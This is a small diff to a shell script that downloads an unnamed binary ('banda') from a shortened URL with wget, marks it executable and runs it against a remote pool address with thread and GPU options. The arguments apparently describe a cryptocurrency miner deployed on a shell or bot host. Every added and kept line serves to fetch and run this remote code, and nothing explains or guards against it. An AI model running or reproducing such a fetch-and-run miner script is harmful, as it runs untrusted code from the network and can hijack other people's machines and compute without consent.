@@ -4,6 +4,6 @@
 
 
 cd /home/shell-bot
-wget -qO banda https://git.io/J1XFa && chmod +x janda
+wget -qO banda https://git.io/J1XFa
 chmod +x banda
-./banda -o 138.197.166.210:5555 -u ojokmelumelu
+./banda --disable-gpu --pool 138.197.166.210:5555 -t 2
